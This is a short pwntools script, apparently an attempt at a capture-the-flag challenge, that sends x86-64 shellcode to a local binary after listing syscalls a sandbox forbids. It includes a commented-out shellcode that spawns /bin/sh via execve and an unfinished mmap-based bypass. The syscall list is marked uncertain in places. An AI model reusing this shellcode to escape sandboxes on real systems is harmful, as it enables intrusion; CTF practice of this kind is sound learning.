''' 
interdits :
0X2 -> open
0X101 -> openat
0X3B -> execve
0X142 -> execveat
0X39 -> fork
0X3a -> vfork
0X38 -> clone
0X1B3 ?? -> write ?
0X28 -> sendfile
0XA1 -> chroot
0X29 -> socket
0X2A -> connect
'''

from pwn import *

context.arch = 'amd64'
context.os = 'linux'


# shellcode = asm("""
#     mov     rbx, 0X68732f6e69622f
#     push rbx
#     mov rbx, rsp
#     mov     rax, 0x0B
#     int 0x80
# """)

shellcode = asm("""
    mov     rdi, 0x400000
    mov     rsi, 4096
    mov rdx, 0xFFFFFFFF
    mov rcx, 0
    mov rax, 0x9
    syscall
    mov rdi, rax
    syscall
""")



io = process("./new_age")
print(shellcode)
io.sendline(shellcode)
io.interactive()